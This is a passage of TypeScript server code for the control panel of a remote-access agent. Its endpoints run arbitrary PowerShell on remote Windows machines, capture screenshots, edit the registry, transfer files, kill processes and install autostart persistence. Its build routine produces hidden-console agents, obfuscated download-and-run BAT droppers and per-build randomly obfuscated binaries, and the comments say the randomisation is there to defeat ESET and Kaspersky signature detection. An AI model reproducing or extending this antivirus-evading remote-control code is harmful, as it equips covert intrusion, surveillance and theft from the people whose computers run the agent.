    if (!auth || (auth.role !== "admin" && auth.role !== "operator")) {
      return json({ error: "Forbidden" }, 403);
    }
    const allClients = listClients({ status: "offline", limit: 10000 });
    let count = 0;
    for (const c of allClients) {
      try { deleteClient(c.id); deleteClientScreenshots(c.id); count++; } catch {}
    }
    return json({ ok: true, count });
  }

  if (pathname.match(/^\/api\/clients\/[^/]+$/) && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const id = pathname.split("/").pop()!;
    const client = getClientById(id);
    if (!client) return json({ error: "Not found" }, 404);
    return json({ ...client, online: isAgentConnected(id) });
  }

  if (pathname.match(/^\/api\/clients\/[^/]+$/) && method === "DELETE") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    const id = pathname.split("/").pop()!;
    deleteClient(id);
    deleteClientScreenshots(id);
    return json({ ok: true });
  }

  // Update tag/note on a client.
  if (pathname.match(/^\/api\/clients\/[^/]+\/tag$/) && (method === "POST" || method === "PATCH")) {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const id = pathname.split("/")[3];
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    updateClientTagNote(id, String(body.tag ?? ""), String(body.note ?? ""));
    return json({ ok: true });
  }

  // Update nickname on a client.
  if (pathname.match(/^\/api\/clients\/[^/]+\/nickname$/) && (method === "POST" || method === "PATCH")) {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const id = pathname.split("/")[3];
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    updateClientNickname(id, String(body.nickname ?? ""));
    return json({ ok: true });
  }

  // Send a command to a connected agent.
  if (pathname.match(/^\/api\/clients\/[^/]+\/command$/) && method === "POST") {
    if (!auth || auth.role === "viewer") return json({ error: "Forbidden" }, 403);
    const clientId = pathname.split("/")[3];
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const action = String(body?.action || "").trim();
    if (!action) return json({ error: "Missing action" }, 400);

    const agent = getAgent(clientId);
    if (!agent) return json({ ok: false, error: "Agent not connected", offline: true }, 404);

    // ── script_exec: run a script on the agent and wait for the result ──────
    if (action === "script_exec") {
      const script      = String(body.script     || "").trim();
      const scriptType  = String(body.scriptType || "powershell").trim();
      const timeoutSecs = Math.min(Math.max(Number(body.timeoutSecs) || 60, 1), 600);
      if (!script) return json({ ok: false, error: "Missing script" }, 400);
      const reqId = `sr-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
      try {
        const result = await dispatchScriptExec(clientId, reqId, script, scriptType, timeoutSecs);
        return json({
          ok:       result.exitCode === 0 && !result.error,
          result:   result.output,
          error:    result.error || undefined,
          exitCode: result.exitCode,
        });
      } catch (e: any) {
        return json({ ok: false, error: String(e?.message || e) }, 500);
      }
    }

    const ALLOWED_ACTIONS: Record<string, object> = {
      ping:        { type: "ping", ts: Date.now() },
      reconnect:   { type: "disconnect" },
      disconnect:  { type: "disconnect" },
    };

    const msgObj = ALLOWED_ACTIONS[action];
    if (!msgObj) return json({ error: `Unknown action: ${action}` }, 400);

    try {
      agent.send(encodeMsgpack(msgObj));
    } catch (e) {
      return json({ error: "Failed to send command to agent" }, 500);
    }

    return json({ ok: true });
  }

  // ---------------------------------------------------------------
  // GET /api/clients/:id/screenshots
  //
  // Returns persisted screenshot history for a client from SQLite
  // (newest first, max 10 entries). Each entry includes the full
  // base64 JPEG data so the dashboard can render thumbnails
  // immediately.
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/screenshots$/) && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const clientId = pathname.split("/")[3];
    return json(getClientScreenshots(clientId));
  }

  // ---------------------------------------------------------------
  // DELETE /api/clients/:id/screenshots
  //
  // Wipes the full screenshot history for a client from SQLite.
  // Operator or admin required.
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/screenshots$/) && method === "DELETE") {
    if (!auth || (auth.role !== "admin" && auth.role !== "operator")) {
      return json({ error: "Forbidden" }, 403);
    }
    const clientId = pathname.split("/")[3];
    deleteClientScreenshots(clientId);
    return json({ ok: true });
  }

  // ---------------------------------------------------------------
  // GET /api/clients/:id/registry?path=HKLM:\SOFTWARE\...
  //
  // Lists the subkeys and values at a registry path on a connected
  // Windows agent. Uses the script_exec (PowerShell) pipeline.
  // Returns { ok, subkeys: string[], values: [{name,data,type}] }
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/registry$/) && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const clientId = pathname.split("/")[3];
    const regPath = url.searchParams.get("path") || "";
    if (!regPath) return json({ error: "path parameter required" }, 400);
    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);
    const psScript = `
$ErrorActionPreference='Stop'
try {
  $key = Get-Item -LiteralPath ${JSON.stringify(regPath)} -ErrorAction Stop
  $subkeys = @($key.GetSubKeyNames() | Sort-Object)
  $values = @($key.GetValueNames() | ForEach-Object {
    $n=$_; $v=$key.GetValue($n); $t=$key.GetValueKind($n).ToString()
    $dstr = if ($t -eq 'Binary') { ($v | ForEach-Object { $_.ToString('X2') }) -join ' ' } else { "$v" }
    [ordered]@{name=$n;data=$dstr;type=$t}
  })
  ConvertTo-Json ([ordered]@{ok=$true;subkeys=$subkeys;values=$values}) -Compress -Depth 4
} catch {
  ConvertTo-Json ([ordered]@{ok=$false;error=$_.Exception.Message}) -Compress -Depth 2
}
`.trim();
    const reqId = `reg-r-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
    try {
      const result = await dispatchScriptExec(clientId, reqId, psScript, "powershell", 20);
      const out = result.output.trim();
      if (!out) return json({ ok: false, error: result.error || "No output from agent" }, 500);
      try {
        const parsed = JSON.parse(out);
        return json(parsed);
      } catch {
        return json({ ok: false, error: "Unparseable agent response", raw: out.slice(0, 500) }, 500);
      }
    } catch (e: any) {
      return json({ ok: false, error: String(e?.message || e) }, 500);
    }
  }

  // ---------------------------------------------------------------
  // POST /api/clients/:id/registry/value
  //
  // Writes (creates or overwrites) a registry value.
  // Body: { path, name, data, type }
  // type must be one of: String, ExpandString, DWord, QWord,
  //                      Binary, MultiString
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/registry\/value$/) && method === "POST") {
    if (!auth || (auth.role !== "admin" && auth.role !== "operator")) {
      return json({ error: "Forbidden" }, 403);
    }
    const clientId = pathname.split("/")[3];
    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);
    const body = await req.json().catch(() => null) as any;
    if (!body || !body.path || body.name === undefined || body.data === undefined || !body.type) {
      return json({ error: "path, name, data, type are required" }, 400);
    }
    const allowed = ["String","ExpandString","DWord","QWord","Binary","MultiString"];
    if (!allowed.includes(body.type)) return json({ error: "Unsupported value type" }, 400);
    const psScript = `
$ErrorActionPreference='Stop'
try {
  $null = New-Item -Path ${JSON.stringify(body.path)} -Force -ErrorAction SilentlyContinue
  Set-ItemProperty -LiteralPath ${JSON.stringify(body.path)} -Name ${JSON.stringify(body.name)} -Value ${JSON.stringify(body.data)} -Type ${body.type} -Force
  ConvertTo-Json ([ordered]@{ok=$true}) -Compress
} catch {
  ConvertTo-Json ([ordered]@{ok=$false;error=$_.Exception.Message}) -Compress -Depth 2
}
`.trim();
    const reqId = `reg-w-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
    try {
      const result = await dispatchScriptExec(clientId, reqId, psScript, "powershell", 20);
      const out = result.output.trim();
      if (!out) return json({ ok: false, error: result.error || "No output from agent" }, 500);
      return json(JSON.parse(out));
    } catch (e: any) {
      return json({ ok: false, error: String(e?.message || e) }, 500);
    }
  }

  // ---------------------------------------------------------------
  // DELETE /api/clients/:id/registry/value
  //
  // Deletes a single registry value.
  // Body: { path, name }
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/registry\/value$/) && method === "DELETE") {
    if (!auth || (auth.role !== "admin" && auth.role !== "operator")) {
      return json({ error: "Forbidden" }, 403);
    }
    const clientId = pathname.split("/")[3];
    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);
    const body = await req.json().catch(() => null) as any;
    if (!body || !body.path || body.name === undefined) {
      return json({ error: "path and name are required" }, 400);
    }
    const psScript = `
$ErrorActionPreference='Stop'
try {
  Remove-ItemProperty -LiteralPath ${JSON.stringify(body.path)} -Name ${JSON.stringify(body.name)} -Force
  ConvertTo-Json ([ordered]@{ok=$true}) -Compress
} catch {
  ConvertTo-Json ([ordered]@{ok=$false;error=$_.Exception.Message}) -Compress -Depth 2
}
`.trim();
    const reqId = `reg-dv-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
    try {
      const result = await dispatchScriptExec(clientId, reqId, psScript, "powershell", 20);
      const out = result.output.trim();
      if (!out) return json({ ok: false, error: result.error || "No output from agent" }, 500);
      return json(JSON.parse(out));
    } catch (e: any) {
      return json({ ok: false, error: String(e?.message || e) }, 500);
    }
  }

  // ---------------------------------------------------------------
  // DELETE /api/clients/:id/registry/key
  //
  // Recursively deletes a registry key and all its sub-content.
  // Body: { path }
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/registry\/key$/) && method === "DELETE") {
    if (!auth || auth.role !== "admin") {
      return json({ error: "Forbidden — admin only" }, 403);
    }
    const clientId = pathname.split("/")[3];
    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);
    const body = await req.json().catch(() => null) as any;
    if (!body || !body.path) return json({ error: "path is required" }, 400);
    const psScript = `
$ErrorActionPreference='Stop'
try {
  Remove-Item -LiteralPath ${JSON.stringify(body.path)} -Recurse -Force
  ConvertTo-Json ([ordered]@{ok=$true}) -Compress
} catch {
  ConvertTo-Json ([ordered]@{ok=$false;error=$_.Exception.Message}) -Compress -Depth 2
}
`.trim();
    const reqId = `reg-dk-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
    try {
      const result = await dispatchScriptExec(clientId, reqId, psScript, "powershell", 20);
      const out = result.output.trim();
      if (!out) return json({ ok: false, error: result.error || "No output from agent" }, 500);
      return json(JSON.parse(out));
    } catch (e: any) {
      return json({ ok: false, error: String(e?.message || e) }, 500);
    }
  }

  // ---------------------------------------------------------------
  // POST /api/clients/:id/screenshot
  //
  // Requests a live screen capture from a connected Windows agent.
  // Uses the existing script_exec pipeline — runs a PowerShell
  // snippet that captures the primary display into a MemoryStream,
  // encodes it as JPEG, and returns the base64 bytes as stdout.
  // Returns { ok, id, data (base64 JPEG), format, capturedAt }.
  // The capture is also pushed to the per-client history ring.
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/screenshot$/) && method === "POST") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const clientId = pathname.split("/")[3];

    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);

    const reqId = `ss-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;

    // ── Path 1: native GDI screenshot (preferred) ─────────────────────────
    // Sends {type:"screenshot"} to the Go agent which uses the Win32
    // GDI/BitBlt path — zero external processes, no powershell.exe spawned.
    // Agents built before this feature respond with an unknown-type log and
    // the request times out, falling through to the PowerShell fallback.
    let b64: string | null = null;
    try {
      const native = await dispatchNativeScreenshot(clientId, reqId, 50, 12_000);
      if (native.ok && native.data && native.data.length > 0) {
        b64 = native.data.toString("base64");
      } else if (!native.ok) {
        console.warn(`[screenshot] native path error for ${clientId}: ${native.error}`);
      }
    } catch {
      // timed out or agent pre-dates native screenshot — fall through
    }

    // ── Path 2: PowerShell fallback (for older agents) ────────────────────
    if (!b64) {
      const psScript = [
        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing",
        "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds",
        "$bmp=New-Object System.Drawing.Bitmap($s.Width,$s.Height)",
        "$g=[System.Drawing.Graphics]::FromImage($bmp)",
        "$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size)",
        "$ms=New-Object System.IO.MemoryStream",
        "$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg)",
        "$g.Dispose();$bmp.Dispose()",
        "[Convert]::ToBase64String($ms.ToArray())",
      ].join(";");
      try {
        const result = await dispatchScriptExec(clientId, reqId + "-ps", psScript, "powershell", 30);
        const raw = result.output.trim();
        if (result.exitCode !== 0 || !raw) {
          return json({ ok: false, error: result.error || "Screenshot capture failed", exitCode: result.exitCode }, 500);
        }
        b64 = raw;
      } catch (e: any) {
        return json({ ok: false, error: String(e?.message || e) }, 500);
      }
    }

    if (!b64) {
      return json({ ok: false, error: "Screenshot capture failed" }, 500);
    }
    const entry = {
      id: reqId,
      capturedAt: Math.floor(Date.now() / 1000),
      data: b64,
      format: "jpeg",
    };
    storeScreenshot(clientId, entry);
    return json({ ok: true, ...entry });
  }

  // ---------------------------------------------------------------
  // POST /api/clients/:id/agent-action
  //
  // Sends a lifecycle action to a connected agent via the WebSocket
  // agent_action message. The Go agent handles these natively (no
  // script_exec required):
  //   persist_install — add HKCU Run key / scheduled task for autostart
  //   persist_remove  — remove Run key / scheduled task
  //   uninstall       — remove persistence and schedule self-deletion
  // Returns: { ok, action, error? }
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/agent-action$/) && method === "POST") {
    if (!auth || (auth.role !== "admin" && auth.role !== "operator")) {
      return json({ error: "Forbidden" }, 403);
    }
    const clientId = pathname.split("/")[3];
    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);

    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const action = String(body?.action ?? "").trim();
    const allowed = ["persist_install", "persist_remove", "uninstall"];
    if (!allowed.includes(action)) {
      return json({ error: `Invalid action. Must be one of: ${allowed.join(", ")}` }, 400);
    }

    const reqId = `aa-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    try {
      const result = await dispatchAgentAction(clientId, reqId, action);
      // Update DB persistence state when the action succeeds
      if (result.ok) {
        if (action === "persist_install") setClientPersistent(clientId, true);
        else if (action === "persist_remove" || action === "uninstall") setClientPersistent(clientId, false);
      }
      return json(result);
    } catch (e: any) {
      return json({ ok: false, action, error: String(e?.message ?? e) }, 500);
    }
  }

  // ---------------------------------------------------------------
  // GET /api/clients/:id/fs?path=C:\...
  //
  // Lists the contents of a directory on a connected Windows agent.
  // Uses the script_exec (PowerShell) pipeline.
  // Returns { ok, path, items: [{name, isDir, size?, modified}] }
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/fs$/) && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const clientId = pathname.split("/")[3];
    const fsPath = url.searchParams.get("path") || "";
    if (!fsPath) return json({ error: "path parameter required" }, 400);
    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);
    const psScript = `
$ErrorActionPreference='Stop'
try {
  $p = [System.Environment]::ExpandEnvironmentVariables(${JSON.stringify(fsPath)})
  $items = @(Get-ChildItem -LiteralPath $p -Force -ErrorAction Stop | ForEach-Object {
    $isDir = $_.PSIsContainer
    [ordered]@{
      name     = $_.Name
      isDir    = $isDir
      size     = if ($isDir) { $null } else { $_.Length }
      modified = $_.LastWriteTime.ToString('yyyy-MM-ddTHH:mm:ss')
    }
  } | Sort-Object { -[int]$_.isDir }, { $_.name })
  ConvertTo-Json ([ordered]@{ok=$true;path=$p;items=$items}) -Compress -Depth 4
} catch {
  ConvertTo-Json ([ordered]@{ok=$false;error=$_.Exception.Message}) -Compress -Depth 2
}
`.trim();
    const reqId = `fs-ls-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
    try {
      const result = await dispatchScriptExec(clientId, reqId, psScript, "powershell", 20);
      const out = result.output.trim();
      if (!out) return json({ ok: false, error: result.error || "No output from agent" }, 500);
      try { return json(JSON.parse(out)); }
      catch { return json({ ok: false, error: "Unparseable agent response", raw: out.slice(0, 400) }, 500); }
    } catch (e: any) {
      return json({ ok: false, error: String(e?.message || e) }, 500);
    }
  }

  // ---------------------------------------------------------------
  // DELETE /api/clients/:id/fs?path=C:\...
  //
  // Deletes a file or directory (recursive) on a connected agent.
  // Operator or admin required.
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/fs$/) && method === "DELETE") {
    if (!auth || (auth.role !== "admin" && auth.role !== "operator")) {
      return json({ error: "Forbidden" }, 403);
    }
    const clientId = pathname.split("/")[3];
    const fsPath = url.searchParams.get("path") || "";
    if (!fsPath) return json({ error: "path parameter required" }, 400);
    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);
    const psScript = `
$ErrorActionPreference='Stop'
try {
  Remove-Item -LiteralPath ${JSON.stringify(fsPath)} -Recurse -Force
  ConvertTo-Json ([ordered]@{ok=$true}) -Compress
} catch {
  ConvertTo-Json ([ordered]@{ok=$false;error=$_.Exception.Message}) -Compress -Depth 2
}
`.trim();
    const reqId = `fs-del-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
    try {
      const result = await dispatchScriptExec(clientId, reqId, psScript, "powershell", 20);
      const out = result.output.trim();
      if (!out) return json({ ok: false, error: result.error || "No output from agent" }, 500);
      return json(JSON.parse(out));
    } catch (e: any) {
      return json({ ok: false, error: String(e?.message || e) }, 500);
    }
  }

  // POST /api/clients/:id/file/push
  //
  // Upload a file from the browser to a connected agent.
  // Body: multipart form with:
  //   file — the file to upload (required)
  //   path — destination absolute path on the agent (required)
  // Returns: { ok, error? }
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/file\/push$/) && method === "POST") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const clientId = pathname.split("/")[3];

    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);

    let formData: FormData;
    try {
      formData = await req.formData();
    } catch {
      return json({ error: "Expected multipart/form-data body" }, 400);
    }

    const fileField = formData.get("file");
    const destPath  = formData.get("path");
    if (!fileField || typeof destPath !== "string" || !destPath.trim()) {
      return json({ error: "Missing 'file' or 'path' field" }, 400);
    }

    const fileBuf = await (fileField as File).arrayBuffer();
    if (fileBuf.byteLength > 100 * 1024 * 1024) {
      return json({ error: "File exceeds 100 MB limit" }, 413);
    }

    const reqId = `fp-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    try {
      const result = await dispatchFilePush(clientId, reqId, destPath.trim(), new Uint8Array(fileBuf));
      return json(result.ok ? { ok: true } : { ok: false, error: result.error });
    } catch (e: any) {
      return json({ ok: false, error: String(e?.message ?? e) }, 500);
    }
  }

  // ---------------------------------------------------------------
  // POST /api/clients/:id/file/pull
  //
  // Download a file from a connected agent to the browser.
  // Body: { path: string }  — absolute path on the agent
  // Returns: binary file stream (Content-Disposition: attachment) on success,
  //          or JSON { ok:false, error } on failure.
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/file\/pull$/) && method === "POST") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const clientId = pathname.split("/")[3];

    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);

    let body: any;
    try { body = await req.json(); } catch { body = {}; }
    const srcPath = String(body?.path ?? "").trim();
    if (!srcPath) return json({ error: "Missing 'path' field" }, 400);

    const reqId = `fp-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    try {
      const result = await dispatchFilePull(clientId, reqId, srcPath);
      if (!result.ok || !result.data) {
        return json({ ok: false, error: result.error ?? "File pull failed" }, 500);
      }
      const filename = result.filename ?? "file";
      const safeFilename = filename.replace(/[^\w\-. ]/g, "_");
      return new Response(result.data, {
        headers: {
          "Content-Type": "application/octet-stream",
          "Content-Disposition": `attachment; filename="${safeFilename}"; filename*=UTF-8''${encodeURIComponent(safeFilename)}`,
          "Content-Length": String(result.data.length),
        },
      });
    } catch (e: any) {
      return json({ ok: false, error: String(e?.message ?? e) }, 500);
    }
  }

  // ---------------------------------------------------------------
  // GET /api/clients/:id/processes
  //
  // Request the running process list from a connected agent.
  // Returns: { ok, procs: [{pid, name, user, mem}], error? }
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/processes$/) && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const clientId = pathname.split("/")[3];

    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);

    const reqId = `pl-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    try {
      const result = await dispatchProcList(clientId, reqId);
      return json(result);
    } catch (e: any) {
      return json({ ok: false, error: String(e?.message ?? e) }, 500);
    }
  }

  // ---------------------------------------------------------------
  // POST /api/clients/:id/processes/:pid/kill
  //
  // Send SIGKILL / TerminateProcess to a PID on the agent.
  // Returns: { ok, error? }
  // ---------------------------------------------------------------
  if (pathname.match(/^\/api\/clients\/[^/]+\/processes\/\d+\/kill$/) && method === "POST") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const parts = pathname.split("/");
    const clientId = parts[3];
    const pid = parseInt(parts[5], 10);

    if (!Number.isFinite(pid) || pid <= 0) return json({ error: "Invalid PID" }, 400);

    const agent = getAgent(clientId);
    if (!agent) return json({ error: "Agent not connected", offline: true }, 404);

    const reqId = `pk-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    try {
      const result = await dispatchProcKill(clientId, reqId, pid);
      return json(result);
    } catch (e: any) {
      return json({ ok: false, error: String(e?.message ?? e) }, 500);
    }
  }

  // ---------------------------------------------------------------
  // Agent Download (for BAT/SH installer scripts)
  // ---------------------------------------------------------------

  if (pathname === "/api/agent/dl" && method === "GET") {
    const dlId = url.searchParams.get("id") || "";

    if (!dlId) return new Response("Missing build ID.", { status: 400 });

    // Check persistent build store first (6-day builds)
    const stored = buildStore.get(dlId);
    if (stored) {
      if (Date.now() > stored.expires) {
        try { unlinkSync(path.join(BUILDS_DIR, dlId)); } catch {}
        buildStore.delete(dlId);
        saveBuildManifest();
        return new Response("Build expired. Please generate a new agent.", { status: 410 });
      }
      const bPath = path.join(BUILDS_DIR, dlId);
      if (!existsSync(bPath)) {
        // File is missing from disk (e.g. workspace was reset). Purge the
        // stale manifest entry so the build list stays accurate.
        buildStore.delete(dlId);
        saveBuildManifest();
        return new Response("Build file missing — please rebuild the agent.", { status: 410 });
      }
      return new Response(Bun.file(bPath), {
        headers: {
          "Content-Type": getMimeType(stored.filename),
          "Content-Disposition": `attachment; filename="${stored.filename}"; filename*=UTF-8''${encodeURIComponent(stored.filename)}`,
        },
      });
    }

    return new Response("Build not found. Please generate a new agent from the Builder page.", { status: 404 });
  }

  // ---------------------------------------------------------------
  // (Removed) Unattended PowerShell installer
  // ---------------------------------------------------------------
  //
  // The agent EXE now self-installs on first run (see
  // Nubyone-Client/cmd/agent/bootstrap), so a separate PS1
  // installer is no longer needed. The block below is a 410 Gone stub
  // kept only so old links surface a clear error instead of 404.
  if (pathname === "/api/agent/install.ps1" && method === "GET") {
    return new Response(
      "# This endpoint has been retired. The agent EXE now self-installs on first run.\n" +
      "# Just deploy the .exe (via GPO, SCCM, RMM, PsExec, etc) and run it once on each PC.\n" +
      "throw 'install.ps1 retired — run the agent .exe directly.'\n",
      { status: 410, headers: { "Content-Type": "text/plain; charset=utf-8" } }
    );
  }

  // ---------------------------------------------------------------
  // Agent Build API
  // ---------------------------------------------------------------

  // ── GET /api/build/download/:filename — serve a built binary ────────────
  if (pathname.startsWith("/api/build/download/") && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const encodedName = pathname.slice("/api/build/download/".length);
    const targetFilename = decodeURIComponent(encodedName);
    for (const [bId, b] of buildStore) {
      if (b.filename === targetFilename && b.expires > Date.now()) {
        const bfp = path.join(BUILDS_DIR, bId);
        if (existsSync(bfp)) {
          return new Response(Bun.file(bfp), {
            headers: {
              "Content-Type": getMimeType(b.filename),
              "Content-Disposition": `attachment; filename="${b.filename}"; filename*=UTF-8''${encodeURIComponent(b.filename)}`,
            },
          });
        }
      }
    }
    return new Response("Not found", { status: 404 });
  }

  // ── DELETE /api/build/:id/delete — delete a build session ────────────────
  const buildDeleteMatch = pathname.match(/^\/api\/build\/([^/]+)\/delete$/);
  if (buildDeleteMatch && method === "DELETE") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const delId = buildDeleteMatch[1];
    const singleBuild = buildStore.get(delId);
    if (singleBuild) {
      try { unlinkSync(path.join(BUILDS_DIR, delId)); } catch {}
      buildStore.delete(delId);
      for (const [platform, bid] of latestBuilds) {
        if (bid === delId) { latestBuilds.delete(platform); break; }
      }
      saveBuildManifest();
    }
    return json({ ok: true });
  }

  // ── GET /api/build/job/:jobId — async build status polling ─────────────
  if (pathname.startsWith("/api/build/job/") && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const jobId = pathname.slice("/api/build/job/".length);
    const job = buildJobs.get(jobId);
    if (!job) return json({ error: "Job not found" }, 404);
    return json(job);
  }

  if (pathname === "/api/build/agent" && method === "POST") {
    if (!auth) return json({ error: "Unauthorized" }, 401);

    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }

    const targetOS   = String(body.os   || "windows").toLowerCase();
    const targetArch = String(body.arch  || "amd64").toLowerCase();
    // Output: "exe" (native binary) or "bat" (obfuscated download-and-run script).
    // BAT is Windows-only; all other platforms default to exe.
    const requestedFormat = String(body.format || body.outputFormat || "exe").toLowerCase().trim();
    const scriptFormat: "bat" | null = requestedFormat === "bat" ? "bat" : null;
    if (scriptFormat && targetOS !== "windows") {
      return json({ error: "BAT output is only supported for Windows targets." }, 400);
    }
    // Sealed-payload mode: when the caller passes encrypt:true, the server
    // generates a per-build random secret and seals the server URL +
    // build-tag + build-id with cryptobox before injecting them via -ldflags.
    // Plaintext DefaultServerURL is still injected as a transparent fallback
    // so legacy consumers / unsealed code paths keep working.
    // plain build: skip garble obfuscation AND cryptobox sealing.
    // Useful for reducing AV ML false-positives and for testing/debugging.
    const plainBuild     = body.plainBuild === true;
    const wantSeal       = !plainBuild && body.encrypt !== false; // default ON unless plainBuild
    // noBootstrap: when true, injects DisableBootstrap=true so the agent
    // skips the self-install stage entirely and connects immediately.
    // Intended for GPO / Intune / SCCM environments where persistence is
    // managed externally. Safe to pass for non-Windows targets — the
    // bootstrap is already a no-op there, so the flag is harmless.
    const noBootstrap    = body.noBootstrap === true;
    let   serverURL  = String(body.serverURL || "").trim();

    const validOS     = ["windows", "linux", "darwin", "freebsd", "android"];
    const validArch   = ["amd64", "arm64", "arm", "386", "armv7"];
    if (!validOS.includes(targetOS))         return json({ error: "Invalid OS" }, 400);
    if (!validArch.includes(targetArch))     return json({ error: "Invalid arch" }, 400);

    if (!serverURL) serverURL = detectPublicBase(req).ws;

    const goArch = targetArch === "armv7" ? "arm" : targetArch;

    // ── Per-build identifiers ─────────────────────────────────────────────
    //
    // garbleSeed is fully random per build so every compiled binary has a
    // unique obfuscation layout and symbol-name mapping. This prevents AV
    // vendors from building a static signature cluster around a fixed
    // garble output shape (ESET WinGo/Packed.Obfuscated.D and Kaspersky
    // VHO: detections are both sensitive to the shape of the obfuscated
    // binary, not just its behaviour). The build cache is intentionally
    // disabled — every call to this endpoint produces a fresh binary.
    //
    // buildId is derived from (os, arch, version, url, timestamp, seed)
    // so it is unique per build and serves as the storage key in BUILDS_DIR.
    const crypto = await import("crypto");
    const garbleSeed = crypto.randomBytes(8).toString("base64");
    const idRaw     = crypto.createHash("sha256")
      .update(`nubyone|${SERVER_VERSION}|${targetOS}|${targetArch}|${serverURL}|${Date.now()}|${garbleSeed}`)
      .digest();
    const buildId   = [
      idRaw.slice(0,4).toString("hex"),
      idRaw.slice(4,6).toString("hex"),
      idRaw.slice(6,8).toString("hex"),
      idRaw.slice(8,10).toString("hex"),
      idRaw.slice(10,16).toString("hex"),
    ].join("-");

    const ldflags: string[] = ["-s", "-w"];
    if (targetOS === "windows" && Boolean(body.hideConsole)) {
      ldflags.push("-H=windowsgui");
    }
    // Bake the customer's server URL into the binary so the EXE is fully
    // self-sufficient: it never requires a sidecar settings.json or an
    // installer wrapper. A sidecar config/settings.json placed next to the
    // executable still wins at runtime (precedence: env > file > baked-in).
    //
    // Go's linker splits the -ldflags string on whitespace, so the URL must
    // not contain spaces, quotes, or backticks. Reject anything suspicious.
    if (/[\s'"`\\]/.test(serverURL)) {
      return json({ error: "Invalid server URL", details: "URL must not contain whitespace or quote characters." }, 400);
    }
    ldflags.push(`-X core/cmd/agent/config.DefaultServerURL=${serverURL}`);

    // ── External-persistence / no-bootstrap flag ──────────────────────────
    // When noBootstrap is requested, bake DisableBootstrap=true into the
    // binary so the self-install stage (file copy, scheduled task, Run key)
    // is skipped entirely. The agent dials the server immediately on first
    // launch. Persistence lifecycle is fully managed by the caller's tooling
    // (GPO, Intune, SCCM, etc.).
    if (noBootstrap) {
      ldflags.push(`-X core/cmd/agent/config.DisableBootstrap=true`);
    }

    // ── Sealed payload injection (cryptobox) ──────────────────────────────
    //
    // Generate a per-build random secret and seal the small set of
    // sensitive build-time strings (server URL, build tag, build ID).
    // The plaintext `-X DefaultServerURL=...` line above is kept as an
    // always-available fallback, so an EXE built with sealing OFF or by
    // an older client is still self-sufficient. If sealing is ON, the
    // agent's config.Load() will prefer the sealed value at runtime
    // (see core/cmd/agent/config/config.go).
    //
    // Only `config/...` labels are used here — see cryptobox.ts for why:
    // host-bound (`host/...`) blobs cannot be issued by the server because
